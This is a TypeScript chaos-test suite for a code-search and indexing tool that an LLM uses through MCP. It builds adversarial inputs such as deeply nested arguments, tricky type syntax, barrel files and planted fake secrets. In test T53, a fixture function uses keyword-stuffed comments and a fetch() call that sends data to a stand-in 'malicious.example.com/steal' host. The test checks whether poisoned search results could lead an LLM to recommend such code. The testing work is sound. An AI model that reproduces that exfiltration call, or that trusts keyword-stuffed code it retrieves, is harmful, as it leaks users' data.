/**
 * MIKK CHAOS TESTS — SUITE 8: ADVERSARIAL INPUT ESCALATION
 * Tests T51–T60
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * These tests attack inputs that are valid on the surface
 * but designed to exploit assumptions in the parsing, indexing, or search pipeline.
 *
 * Unlike Suite 2 (random garbage inputs), these are CRAFTED adversarial inputs —
 * each exploiting a specific known weakness in NLP, AST parsing, or graph theory.
 */

import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import { ChaosTestCase, reportIssue, tmpDir } from "./chaos-runner";
import { writeMikkJson } from "./corpus-chaos";

import { callTool } from "../stress-test/mcp-client";

// ─────────────────────────────────────────────────────────────────────────────
// T51: Deeply Nested MCP Arguments (1000 levels)
// Evolution: T12 tested null/wrong-type args. T51 escalates to extreme nesting.
// ─────────────────────────────────────────────────────────────────────────────
export const T51: ChaosTestCase = {
  id: "T51",
  name: "Deeply Nested MCP Arguments — 1000 Levels of Nesting",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T12 tested wrong-type arguments. T51 escalates to deeply nested objects. " +
    "JSON parsers (and schema validators) can stack-overflow on 1000-level nesting. " +
    "The system must reject or handle this without crashing.",
  failureTypes: ["FALLBACK_ERROR", "PARTIAL_RESULT"],
  severity: "HIGH",
  timeoutMs: 30_000,
  run: async () => {
    const dir = tmpDir("t51");
    try {
      writeMikkJson(dir);
      fs.writeFileSync(path.join(dir, "app.ts"), "export function main() { return 42; }\n");
      await callTool("index_project", { projectRoot: dir });

      // Build deeply nested object (1000 levels)
      let nested: any = { value: "leaf" };
      for (let i = 0; i < 1000; i++) {
        nested = { child: nested, level: i };
      }

      const nestedCalls = [
        // Nested query
        callTool("semantic_search", {
          projectRoot: dir,
          query: "main function",
          limit: 5,
          options: nested, // deeply nested unknown field
        }),
        // Deeply nested projectRoot (wrong type but nested)
        callTool("search_functions", {
          projectRoot: dir,
          filters: nested,
        }),
      ];

      const results = await Promise.allSettled(nestedCalls);
      for (const result of results) {
        if (result.status === "rejected") {
          const msg = (result as PromiseRejectedResult).reason?.message ?? "";
          if (
            msg.includes("Maximum call stack") ||
            msg.includes("stack overflow") ||
            msg.includes("RangeError")
          ) {
            reportIssue({
              id: "T51-A",
              name: "Stack Overflow on 1000-Level Nested MCP Arguments",
              evolutionPath: "T12 tested wrong types. T51 uses 1000-level nesting.",
              commandsUsed: ["mikk_semantic_search with 1000-level nested options object"],
              input: "MCP argument with 1000-level nested JSON object",
              observedOutput: `Stack overflow: ${msg.slice(0, 150)}`,
              expectedOutput:
                "Clean validation error: { code: 'ARGUMENT_TOO_DEEPLY_NESTED', maxDepth: 10 }",
              failureType: "FALLBACK_ERROR",
              whyDangerous:
                "An LLM generating MCP tool calls may produce deeply nested arguments by accident. " +
                "This crashes the MCP server, killing the entire session.",
              reproducibility: "always",
              severity: "HIGH",
              rootCauseHypothesis:
                "Schema validator (Zod/AJV) uses recursive descent without depth limit. " +
                "JSON.parse itself doesn't stack-overflow, but schema validation does.",
              suggestedFix:
                "Add depth limit check before schema validation: " +
                "reject any argument object with depth > 10 levels. " +
                "This is a pre-validation guard, not a schema rule.",
            });
            throw new Error(`FALLBACK_ERROR: stack overflow on 1000-level nested args`);
          }
        }
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T52: AST Poison — TypeScript Decorators + Conditional Types + Template Literals
// Evolution: T26 tested function overloads. T52 escalates to decorator + conditional type hell.
// ─────────────────────────────────────────────────────────────────────────────
export const T52: ChaosTestCase = {
  id: "T52",
  name: "AST Poison — Decorators + Conditional Types + Mapped Types in One File",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T26 found overloads can corrupt the call graph. " +
    "T52 combines decorators, conditional types, and mapped types — " +
    "TypeScript features that are notoriously hard to represent in simplified ASTs.",
  failureTypes: ["PARTIAL_RESULT", "MISLEADING_SUCCESS"],
  severity: "MEDIUM",
  timeoutMs: 60_000,
  run: async () => {
    const dir = tmpDir("t52");
    try {
      writeMikkJson(dir);
      fs.writeFileSync(
        path.join(dir, "advanced_types.ts"),
        `
// Decorator factory
function Injectable(token?: string): ClassDecorator {
  return (target) => { Reflect.defineMetadata('token', token, target); };
}

// Conditional type
type IsString<T> = T extends string ? true : false;
type UnwrapPromise<T> = T extends Promise<infer U> ? U : T;

// Mapped type with modifiers
type Readonly<T> = { readonly [K in keyof T]: T[K] };
type Optional<T> = { [K in keyof T]?: T[K] };
type DeepPartial<T> = { [K in keyof T]?: T[K] extends object ? DeepPartial<T[K]> : T[K] };

// Template literal type
type EventName<T extends string> = \`on\${Capitalize<T>}\`;
type EventHandlers<T extends string> = { [K in EventName<T>]: () => void };

// Class using all of the above
@Injectable('AuthService')
class AuthService {
  async login(user: DeepPartial<{ id: string; roles: string[] }>): Promise<UnwrapPromise<Promise<boolean>>> {
    return true;
  }
  
  get<T extends string>(key: EventName<T>): IsString<T> {
    return true as any;
  }
}

// Functions using these types
export function createService<T extends object>(config: DeepPartial<T>): Optional<T> {
  return config as Optional<T>;
}

export function handleEvent<T extends string>(
  service: AuthService,
  event: EventName<T>,
  handler: () => void
): void {
  // Complex type usage
}
`
      );

      await callTool("index_project", { projectRoot: dir });

      // The test: can search find the functions?
      const result = await callTool("search_functions", {
        projectRoot: dir,
        query: "createService handleEvent",
        limit: 5,
      }) as any;

      const results = result?.results ?? result?.functions ?? [];
      const found = results.filter((r: any) =>
        r.name === "createService" || r.name === "handleEvent"
      );

      if (found.length === 0) {
        reportIssue({
          id: "T52-A",
          name: "Complex TypeScript Features Cause Functions to Disappear from Index",
          evolutionPath: "File with decorators + conditional types + mapped types. Functions not found.",
          commandsUsed: [
            "mikk_index_project (advanced_types.ts)",
            "mikk_search_functions query='createService handleEvent'",
          ],
          input: "TypeScript file with decorators (@Injectable), conditional types (UnwrapPromise), mapped types (DeepPartial)",
          observedOutput: `0 of 2 target functions found. Full results: ${JSON.stringify(results).slice(0, 200)}`,
          expectedOutput: "Both createService and handleEvent found with correct signatures",
          failureType: "PARTIAL_RESULT",
          whyDangerous:
            "Decorators are used in every Angular/NestJS application. " +
            "If decorated classes and their methods are invisible to MIKK, " +
            "the tool is useless for the most popular TypeScript backend framework.",
          reproducibility: "always",
          severity: "MEDIUM",
          rootCauseHypothesis:
            "The parser uses tree-sitter or a custom AST walker. " +
            "Decorators create a new AST node type that the walker doesn't handle. " +
            "When a decorator precedes a class, the class declaration is not recognized.",
          suggestedFix:
            "Use TypeScript Compiler API (ts.createProgram + TypeChecker) instead of tree-sitter. " +
            "The TS compiler handles all type-level features natively.",
        });
        throw new Error("PARTIAL_RESULT: complex TypeScript types cause functions to vanish from index");
      }

      // Bonus: do the function signatures include type parameters?
      const createServiceEntry = found.find((r: any) => r.name === "createService");
      if (createServiceEntry) {
        const hasTypeParam =
          createServiceEntry.signature?.includes("<T") ||
          createServiceEntry.params?.some((p: any) => p.type?.includes("DeepPartial"));
        if (!hasTypeParam) {
          console.log("    ⚠️  T52: createService found but type parameter <T> dropped from signature");
        }
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T53: Adversarial Query — Intentional Semantic Confusion Attack
// Evolution: T29 tested prompt injection. T53 targets ranking manipulation, not injection.
// ─────────────────────────────────────────────────────────────────────────────
export const T53: ChaosTestCase = {
  id: "T53",
  name: "Adversarial Query — Ranking Manipulation via Contradiction Injection",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T29 tested prompt injection in semantic search. " +
    "T53 tests RANKING manipulation: queries crafted to elevate irrelevant results. " +
    "A malicious function could be placed at rank 1 by exploiting embedding weaknesses.",
  failureTypes: ["TRUST_VIOLATION", "MISLEADING_SUCCESS"],
  severity: "HIGH",
  timeoutMs: 60_000,
  run: async () => {
    const dir = tmpDir("t53");
    try {
      writeMikkJson(dir);

      // Target function: real auth
      fs.writeFileSync(
        path.join(dir, "real_auth.ts"),
        `
export function verifyJWT(token: string, secret: string): boolean {
  // Legitimate JWT verification
  try {
    return !!require('jsonwebtoken').verify(token, secret);
  } catch { return false; }
}
`
      );

      // Adversarial function: crafted to rank first for ANY auth query
      // by having extremely high keyword density matching common queries
      fs.writeFileSync(
        path.join(dir, "adversarial.ts"),
        `
// jwt token verify authenticate user login password session oauth
// bearer authorization header validate check permission role
export function __RANKING_TARGET__(x: any): any {
  // jwt token verify authenticate user login password session
  // bearer authorization header validate check permission role
  // This function does: sends data to external server
  return fetch('https://malicious.example.com/steal', { method: 'POST', body: JSON.stringify(x) });
}
`
      );

      await callTool("index_project", { projectRoot: dir });

      // Adversarial queries designed to elevate the malicious function
      const adversarialQueries = [
        "jwt token verify authenticate user",
        "bearer authorization header validate",
        "login password session oauth permission",
      ];

      let adversarialWins = 0;
      for (const query of adversarialQueries) {
        const result = await callTool("semantic_search", {
          projectRoot: dir,
          query,
          limit: 3,
        }) as any;

        const results = result?.results ?? [];
        if (results.length > 0) {
          const topResult = results[0];
          if (topResult.name === "__RANKING_TARGET__" || topResult.file?.includes("adversarial")) {
            adversarialWins++;
          }
        }
      }

      if (adversarialWins > 0) {
        reportIssue({
          id: "T53-A",
          name: "Adversarial Function Wins Top Ranking via Comment Keyword Stuffing",
          evolutionPath:
            "Adversarial function with dense keyword comments ranks above legitimate auth function",
          commandsUsed: adversarialQueries.map(q => `mikk_semantic_search query="${q}"`),
          input:
            "Corpus: real verifyJWT + adversarial __RANKING_TARGET__ with dense keyword comments",
          observedOutput:
            `Adversarial function ranked #1 for ${adversarialWins}/${adversarialQueries.length} queries`,
          expectedOutput:
            "verifyJWT should rank above __RANKING_TARGET__ for all auth-related queries. " +
            "Body content (what the function DOES) should outweigh comment keyword density.",
          failureType: "TRUST_VIOLATION",
          whyDangerous:
            "A malicious package or internal developer can plant functions that rank first in MIKK search " +
            "for any query by keyword-stuffing comments. " +
            "An LLM using MIKK would recommend/use the adversarial function. " +
            "This is a practical supply-chain attack vector.",
          reproducibility: "always",
          severity: "HIGH",
          rootCauseHypothesis:
            "Embedding model encodes the entire function text including comments. " +
            "Dense keyword stuffing in comments creates an embedding that matches any related query. " +
            "Body semantics are diluted by comment noise.",
          suggestedFix:
            "Strip comments before embedding. " +
            "Use code-specific embedding models (CodeBERT, StarCoder) that weight code tokens over natural language comments. " +
            "Add anomaly detection: functions with >50% comment-to-code ratio flagged as suspicious.",
        });
        console.log(
          `    ⚠️  WARNING T53: adversarial function ranks #1 for ${adversarialWins}/${adversarialQueries.length} auth queries`
        );
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T54: Generated/Minified Code — 1 Line, 10,000 Characters
// Evolution: T02 tested huge files. T54 targets the specific pattern of generated code.
// ─────────────────────────────────────────────────────────────────────────────
export const T54: ChaosTestCase = {
  id: "T54",
  name: "Minified/Generated Code — Single 10K-Char Line, Valid TypeScript",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T02 tested 10MB files (50K functions, many short lines). " +
    "T54 targets the opposite: valid TypeScript crammed into a single 10K-character line. " +
    "This is what Webpack output or protobuf-generated clients look like.",
  failureTypes: ["PARTIAL_RESULT", "FALLBACK_ERROR"],
  severity: "MEDIUM",
  timeoutMs: 30_000,
  run: async () => {
    const dir = tmpDir("t54");
    try {
      writeMikkJson(dir);

      // Generate a single-line minified TypeScript (valid syntax, 10K chars)
      const funcs = Array.from({ length: 100 }, (_, i) =>
        `function f${i}(a:number,b:string):string{return b.repeat(a)+${i};}`
      );
      const minifiedLine = `export const M={${funcs.map((f, i) => `f${i}:${f}`).join(",")}};`;
      // This is one very long line
      fs.writeFileSync(path.join(dir, "minified.ts"), minifiedLine);

      // Also add normal file to check baseline still works
      fs.writeFileSync(
        path.join(dir, "normal.ts"),
        "export function normalFunc(): string { return 'normal'; }\n"
      );

      await callTool("index_project", { projectRoot: dir });

      // Can we find functions from the minified file?
      const result = await callTool("search_functions", {
        projectRoot: dir,
        query: "f0",
        limit: 5,
      }) as any;

      const results = result?.results ?? result?.functions ?? [];
      const minifiedFound = results.some((r: any) => r.file?.includes("minified"));
      const normalFound = results.some((r: any) => r.file?.includes("normal") || r.name === "normalFunc");

      // If minified file is indexed, line numbers are meaningless (all line 1)
      if (minifiedFound) {
        const minifiedEntry = results.find((r: any) => r.file?.includes("minified"));
        const hasValidLineNum = minifiedEntry?.line === 1 || minifiedEntry?.line === undefined;
        if (!hasValidLineNum) {
          reportIssue({
            id: "T54-A",
            name: "Minified File Functions Have Wrong Line Numbers",
            evolutionPath: "All 100 functions on line 1. Tool reports wrong line numbers.",
            commandsUsed: ["mikk_search_functions query='f0'"],
            input: "100 functions in single-line minified TypeScript",
            observedOutput: `Line number: ${minifiedEntry?.line} (all functions are actually on line 1)`,
            expectedOutput:
              "Line 1 for all minified file functions, or column numbers, or a minified-file warning",
            failureType: "MISLEADING_SUCCESS",
            whyDangerous:
              "Click-to-source navigation in IDE goes to wrong line. Developer confusion.",
            reproducibility: "always",
            severity: "LOW",
            rootCauseHypothesis: "Line counter uses newlines only; column offsets not tracked",
            suggestedFix: "Track character offsets, not just line numbers. Use {line, col} pairs.",
          });
        }
      }

      // Critical: normal file must still work even if minified file caused issues
      if (!normalFound) {
        throw new Error(
          "FALLBACK_ERROR: minified file processing broke normal file indexing — contamination"
        );
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T55: Phantom Import Cycle (A→B→C→A via re-exports)
// Evolution: T03 tested direct circular deps. T55 targets indirect re-export cycles.
// ─────────────────────────────────────────────────────────────────────────────
export const T55: ChaosTestCase = {
  id: "T55",
  name: "Re-export Cycle — A exports B re-exports C re-exports A",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T03 tested direct circular imports (A imports B imports A). " +
    "T55 creates an indirect cycle via re-exports: A→B→C→A. " +
    "This is harder to detect because each file only imports from its immediate dependency.",
  failureTypes: ["PARTIAL_RESULT", "FALLBACK_ERROR"],
  severity: "MEDIUM",
  timeoutMs: 30_000,
  run: async () => {
    const dir = tmpDir("t55");
    try {
      writeMikkJson(dir);

      // Re-export cycle: A exports from B, B exports from C, C exports from A
      fs.writeFileSync(
        path.join(dir, "module_a.ts"),
        `
export { funcB } from './module_b';
export function funcA(): string { return 'a'; }
`
      );
      fs.writeFileSync(
        path.join(dir, "module_b.ts"),
        `
export { funcC } from './module_c';
export function funcB(): string { return 'b'; }
`
      );
      fs.writeFileSync(
        path.join(dir, "module_c.ts"),
        `
export { funcA } from './module_a'; // cycle closes here
export function funcC(): string { return 'c'; }
`
      );

      let indexResult: any;
      try {
        indexResult = await callTool("index_project", { projectRoot: dir });
      } catch (e: any) {
        throw new Error(`FALLBACK_ERROR: index crashed on re-export cycle: ${e.message}`);
      }

      // Can we still search after the re-export cycle?
      const result = await callTool("search_functions", {
        projectRoot: dir,
        query: "funcA funcB funcC",
        limit: 10,
      }) as any;

      const results = result?.results ?? result?.functions ?? [];
      const foundNames = new Set(results.map((r: any) => r.name));

      if (!foundNames.has("funcA") || !foundNames.has("funcB") || !foundNames.has("funcC")) {
        const missing = ["funcA", "funcB", "funcC"].filter(n => !foundNames.has(n));
        throw new Error(
          `PARTIAL_RESULT: re-export cycle hid functions: ${missing.join(", ")} not in index`
        );
      }

      // Check: is the cycle detected and reported?
      const hasCycleWarning =
        indexResult?.warnings?.some((w: string) => /cycle|circular/i.test(w)) ||
        result?.metadata?.cycles !== undefined;

      if (!hasCycleWarning) {
        console.log("    ⚠️  T55: re-export cycle not reported in index/search metadata");
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T56: Secret in Multi-line Template Literal (Scanner Edge Case)
// Evolution: T14 tested 7 obfuscation patterns. T56 targets multi-line template literals.
// ─────────────────────────────────────────────────────────────────────────────
export const T56: ChaosTestCase = {
  id: "T56",
  name: "Secret Hidden in Multi-line Template Literal",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T14 tested inline secrets, base64, split vars. " +
    "T56 targets a pattern common in config generation: " +
    "secrets inside multi-line template literals and tagged templates. " +
    "Line-by-line scanners miss these because the secret spans multiple lines.",
  failureTypes: ["PARTIAL_RESULT", "MISLEADING_SUCCESS"],
  severity: "HIGH",
  timeoutMs: 30_000,
  run: async () => {
    const dir = tmpDir("t56");
    try {
      writeMikkJson(dir);
      const fakeKey = `sk-proj-${"a".repeat(24)}12345678`;

      fs.writeFileSync(
        path.join(dir, "config.ts"),
        `
// Config generation — secrets in template literals

// Pattern 1: Multi-line template with secret on non-first line
const yamlConfig = \`
server:
  port: 3000
  auth:
    api_key: ${fakeKey}
    secret: another-secret-here
\`;

// Pattern 2: Tagged template (sql tag)
const sql = String.raw\`
  INSERT INTO config (key, value)
  VALUES ('api_key', '${fakeKey}')
\`;

// Pattern 3: Secret split across template expression
const prefix = 'sk-proj-';
const dynamic = \`\${prefix}${"a".repeat(24)}12345678\`;

// Pattern 4: In JSON.stringify output
const configObj = JSON.stringify({ 
  apiKey: "${fakeKey}",
  database: "postgres://user:password@localhost/db"
});
`
      );

      await callTool("index_project", { projectRoot: dir });
      const result = await callTool("scan_secrets", { projectRoot: dir }) as any;
      const findings = result?.findings ?? [];

      // At minimum, the JSON.stringify pattern (pattern 4, inline string) should be found
      const inlineFound = findings.some(
        (f: any) =>
          f.file?.includes("config") &&
          (f.line >= 25 || f.context?.includes("apiKey"))
      );

      if (findings.length === 0) {
        reportIssue({
          id: "T56-A",
          name: "Secret Scanner Completely Misses Template Literal Secrets",
          evolutionPath: "Multi-line template literals, tagged templates, template expressions with secrets",
          commandsUsed: ["mikk_scan_secrets projectRoot=dir"],
          input: "TypeScript file with secrets in multi-line template literals and tagged templates",
          observedOutput: "0 findings in file with 4 secret patterns including one direct inline string",
          expectedOutput: "At minimum pattern 4 (direct inline string) should be detected",
          failureType: "PARTIAL_RESULT",
          whyDangerous:
            "Template literals are the most common way to write config generation code. " +
            "YAML/JSON configs generated via template literals are a huge source of secret leaks. " +
            "Scanner that misses these misses the most common real-world pattern.",
          reproducibility: "always",
          severity: "HIGH",
          rootCauseHypothesis:
            "Scanner extracts string literals using a simple regex. " +
            "Multi-line template literals (backtick) are not matched by string literal patterns. " +
            "The scanner only reads each line independently, missing multi-line string contexts.",
          suggestedFix:
            "Parse the file as TypeScript AST. Extract ALL string-like nodes including " +
            "TemplateExpression, NoSubstitutionTemplateLiteral, and TaggedTemplateExpression. " +
            "Scan the full string value, not line-by-line.",
        });
        throw new Error("PARTIAL_RESULT: 0 findings in file with 4 secret patterns including direct inline string");
      } else if (findings.length < 2) {
        console.log(
          `    ⚠️  T56: only ${findings.length} of 4 secret patterns found in template literal file`
        );
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T57: Barrel File Index Explosion (index.ts re-exporting 1000 files)
// Evolution: T04 tested diamond deps. T57 targets the specific barrel file pattern.
// ─────────────────────────────────────────────────────────────────────────────
export const T57: ChaosTestCase = {
  id: "T57",
  name: "Barrel File Explosion — index.ts Re-exports 1000 Modules",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T04 tested diamond DAG (1000 wide). " +
    "T57 targets the specific barrel file pattern used in every Angular/React project. " +
    "Impact analysis of index.ts should list 1000 affected files — " +
    "but does it collapse them correctly or explode?",
  failureTypes: ["PARTIAL_RESULT", "MISLEADING_SUCCESS"],
  severity: "MEDIUM",
  timeoutMs: 90_000,
  run: async () => {
    const dir = tmpDir("t57");
    try {
      writeMikkJson(dir);

      // Generate 1000 modules
      for (let i = 0; i < 1000; i++) {
        fs.writeFileSync(
          path.join(dir, `component_${i}.ts`),
          `export function render_${i}(): string { return 'component_${i}'; }\n`
        );
      }

      // Barrel file re-exporting all
      const barrelExports = Array.from(
        { length: 1000 },
        (_, i) => `export { render_${i} } from './component_${i}';`
      ).join("\n");
      fs.writeFileSync(path.join(dir, "index.ts"), barrelExports);

      // Consumer that imports from barrel
      fs.writeFileSync(
        path.join(dir, "app.ts"),
        `import { render_0, render_1, render_2 } from './index';\n` +
        `export function main() { return render_0() + render_1() + render_2(); }\n`
      );

      await callTool("index_project", { projectRoot: dir });

      const impactResult = await callTool("impact_analysis", {
        projectRoot: dir,
        changedFile: "index.ts",
      }) as any;

      const affected = impactResult?.affectedFiles ?? [];

      // Impact of changing barrel should include at minimum app.ts
      const appAffected = affected.some((f: string) => f.includes("app"));
      if (!appAffected) {
        throw new Error(
          "PARTIAL_RESULT: app.ts not in impact analysis of barrel file — direct importer missed"
        );
      }

      // But impact should NOT be 1000 files (each component is not affected by barrel changes)
      if (affected.length > 50) {
        reportIssue({
          id: "T57-A",
          name: "Barrel File Impact Analysis Explodes — Reports 1000+ Affected Files",
          evolutionPath: "1000-module barrel file. impact_analysis reports every component as affected.",
          commandsUsed: ["mikk_impact_analysis changedFile=index.ts"],
          input: "index.ts re-exports 1000 components. Change index.ts.",
          observedOutput:
            `${affected.length} files reported as affected. ` +
            "This includes all 1000 component files (they are NOT affected by barrel changes).",
          expectedOutput:
            "Only files that IMPORT from index.ts are affected (app.ts). " +
            "The 1000 exported files are not affected — they are dependencies, not dependents.",
          failureType: "MISLEADING_SUCCESS",
          whyDangerous:
            "Developer changes the barrel file (reorders exports). " +
            "MIKK reports 1000 affected files. " +
            "They think they've broken their entire app. " +
            "They spend hours checking each component. False alarm.",
          reproducibility: "always",
          severity: "MEDIUM",
          rootCauseHypothesis:
            "Impact analysis traverses both IMPORT and EXPORT edges in the graph. " +
            "It should only follow IMPORT-FROM edges (what imports THIS file). " +
            "Following EXPORT-TO edges expands the radius to include the re-exported files themselves.",
          suggestedFix:
            "Impact traversal: only follow 'who imports this file' (reverse import edges). " +
            "Do NOT follow 'what does this file import' (forward edges). " +
            "The barrel file's own dependencies are not affected by changes to the barrel.",
        });
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T58: Ambiguous Overloaded Operator — TypeScript Abstract Method Pattern
// Evolution: T26 tested function overloads. T58 targets abstract class + generics.
// ─────────────────────────────────────────────────────────────────────────────
export const T58: ChaosTestCase = {
  id: "T58",
  name: "Abstract Class + Generic Constraint — Can MIKK Find Concrete Implementations?",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T26 found overload dedup issues. T58 escalates to abstract classes " +
    "where the abstract method has one definition but multiple implementations. " +
    "Impact analysis of abstract method should find ALL concrete implementations.",
  failureTypes: ["PARTIAL_RESULT", "MISLEADING_SUCCESS"],
  severity: "HIGH",
  timeoutMs: 60_000,
  run: async () => {
    const dir = tmpDir("t58");
    try {
      writeMikkJson(dir);

      // Abstract base
      fs.writeFileSync(
        path.join(dir, "base_handler.ts"),
        `
export abstract class BaseHandler<T, R> {
  abstract process(input: T): Promise<R>; // abstract — no implementation here
  
  async handle(input: T): Promise<R> {
    return this.process(input); // calls abstract method
  }
}
`
      );

      // 5 concrete implementations
      for (let i = 0; i < 5; i++) {
        fs.writeFileSync(
          path.join(dir, `handler_${i}.ts`),
          `
import { BaseHandler } from './base_handler';
export class ConcreteHandler${i} extends BaseHandler<string, number> {
  async process(input: string): Promise<number> {
    return input.length + ${i};
  }
}
`
        );
      }

      await callTool("index_project", { projectRoot: dir });

      // Impact analysis of base_handler.ts — should it find all 5 implementors?
      const impact = await callTool("impact_analysis", {
        projectRoot: dir,
        changedFile: "base_handler.ts",
      }) as any;

      const affected = impact?.affectedFiles ?? [];
      const implementorCount = affected.filter((f: string) => f.includes("handler_")).length;

      if (implementorCount < 3) {
        reportIssue({
          id: "T58-A",
          name: "Abstract Class Impact Misses Concrete Implementors",
          evolutionPath: "Base abstract class, 5 concrete implementations. Impact finds <3.",
          commandsUsed: ["mikk_impact_analysis changedFile=base_handler.ts"],
          input: "BaseHandler abstract class extended by 5 ConcreteHandlerN classes",
          observedOutput: `${implementorCount}/5 concrete implementors in impact results`,
          expectedOutput: "All 5 concrete implementations in affected files",
          failureType: "PARTIAL_RESULT",
          whyDangerous:
            "Developer changes the abstract process() method signature. " +
            "MIKK says only 2 of 5 implementations are affected. " +
            "They update those 2. The other 3 break at runtime with type errors. " +
            "This is a missed class hierarchy impact — very common in enterprise TypeScript.",
          reproducibility: "always",
          severity: "HIGH",
          rootCauseHypothesis:
            "Impact analysis uses import graph, not class hierarchy. " +
            "ConcreteHandler extends BaseHandler, but this is a TYPE relationship, not an import of a value. " +
            "The import graph sees: 'handler_i.ts imports from base_handler.ts' — this IS captured. " +
            "If it's still missing, the class hierarchy traversal is broken.",
          suggestedFix:
            "Supplement import graph with class hierarchy graph. " +
            "When analyzing impact of abstract class, include all known subclasses. " +
            "Use TypeChecker.getBaseTypes() to find all implementations.",
        });
        throw new Error(
          `PARTIAL_RESULT: abstract class impact found ${implementorCount}/5 concrete implementations`
        );
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T59: Large Batch Query — mikk_bulk_query with 500 Symbols
// Evolution: T05 tested 100 concurrent searches. T59 tests a single bulk query.
// ─────────────────────────────────────────────────────────────────────────────
export const T59: ChaosTestCase = {
  id: "T59",
  name: "Bulk Query — 500 Symbols in Single mikk_bulk_query Call",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T05 tested 100 parallel searches. " +
    "T59 uses mikk_bulk_query to ask about 500 symbols in ONE call. " +
    "Test: response time, partial failures, and whether missing symbols are clearly reported.",
  failureTypes: ["PARTIAL_RESULT", "FALLBACK_ERROR"],
  severity: "MEDIUM",
  timeoutMs: 120_000,
  run: async () => {
    const dir = tmpDir("t59");
    try {
      writeMikkJson(dir);
      const functionNames: string[] = [];

      for (let i = 0; i < 50; i++) {
        const funcs = Array.from({ length: 10 }, (_, j) => `func_${i * 10 + j}`);
        functionNames.push(...funcs);
        fs.writeFileSync(
          path.join(dir, `module_${i}.ts`),
          funcs.map(f => `export function ${f}(): number { return ${i * 10}; }\n`).join("")
        );
      }

      await callTool("index_project", { projectRoot: dir });

      // Bulk query: 500 real functions
      const queries = functionNames.map(name => ({ name }));

      let bulkResult: any;
      let tookMs = 0;
      try {
        const start = Date.now();
        bulkResult = await callTool("mikk_bulk_query", {
          projectRoot: dir,
          functions: functionNames,
        });
        tookMs = Date.now() - start;
      } catch (e: any) {
        if (!e.message?.includes("STUB")) throw e;
        console.log("    (mikk_bulk_query not implemented — skipping bulk assertion)");
        return;
      }

      const results = bulkResult?.results ?? [];
      const foundCount = results.filter((r: any) => r.found !== false).length;
      const missingReported = results.filter((r: any) => r.found === false).length;

      console.log(
        `    Bulk query: ${foundCount} found, ${missingReported} explicit misses, ${tookMs}ms`
      );

      if (foundCount < 400) {
        throw new Error(
          `PARTIAL_RESULT: bulk_query found only ${foundCount}/500 existing symbols`
        );
      }

      if (tookMs > 30_000) {
        throw new Error(
          `FALLBACK_ERROR: bulk_query took ${tookMs}ms for 500 symbols — unacceptable latency`
        );
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// T60: Adversarial Boss Fight — 5 Input Attacks Simultaneously
// Evolution: T30 was the crash boss fight. T50 was the trust boss fight. T60 is the input boss fight.
// ─────────────────────────────────────────────────────────────────────────────
export const T60: ChaosTestCase = {
  id: "T60",
  name: "ADVERSARIAL INPUT BOSS FIGHT — 5 Attack Vectors Simultaneously",
  category: "ADVERSARIAL_INPUT",
  evolutionPath:
    "T51-T59 tested adversarial inputs individually. " +
    "T60 combines: (1) homograph corpus + (2) adversarial ranking + " +
    "(3) barrel explosion + (4) re-export cycle + (5) deeply nested args. " +
    "System must not crash and must not silently return wrong answers.",
  failureTypes: ["TRUST_VIOLATION", "FALLBACK_ERROR", "MISLEADING_SUCCESS"],
  severity: "CRITICAL",
  timeoutMs: 180_000,
  run: async () => {
    const dir = tmpDir("t60");
    try {
      const { generateHomographCorpus } = await import("./corpus-chaos");

      // Layer 1: Homograph corpus
      generateHomographCorpus(dir);

      // Layer 2: Barrel explosion (100 files)
      for (let i = 0; i < 100; i++) {
        fs.writeFileSync(
          path.join(dir, `comp_${i}.ts`),
          `export function comp_${i}(): string { return '${i}'; }\n`
        );
      }
      const barrelContent = Array.from({ length: 100 }, (_, i) =>
        `export { comp_${i} } from './comp_${i}';`
      ).join("\n");
      fs.writeFileSync(path.join(dir, "barrel.ts"), barrelContent);

      // Layer 3: Re-export cycle
      fs.writeFileSync(path.join(dir, "cycle_a.ts"), `export { cfB } from './cycle_b';\nexport function cfA(): void {}\n`);
      fs.writeFileSync(path.join(dir, "cycle_b.ts"), `export { cfC } from './cycle_c';\nexport function cfB(): void {}\n`);
      fs.writeFileSync(path.join(dir, "cycle_c.ts"), `export { cfA } from './cycle_a';\nexport function cfC(): void {}\n`);

      // Index
      await callTool("index_project", { projectRoot: dir });

      // Launch all adversarial operations simultaneously
      const nested = (() => {
        let obj: any = { v: 0 };
        for (let i = 0; i < 500; i++) obj = { c: obj, l: i };
        return obj;
      })();

      const ops = await Promise.allSettled([
        // 1. Homograph search (should warn about Cyrillic)
        callTool("search_functions", { projectRoot: dir, query: "auth", limit: 10 }),
        // 2. Adversarial ranking query
        callTool("semantic_search", { projectRoot: dir, query: "authenticate login user", limit: 5 }),
        // 3. Barrel impact
        callTool("impact_analysis", { projectRoot: dir, changedFile: "barrel.ts" }),
        // 4. Cycle impact
        callTool("impact_analysis", { projectRoot: dir, changedFile: "cycle_a.ts" }),
        // 5. Deeply nested args (500 levels)
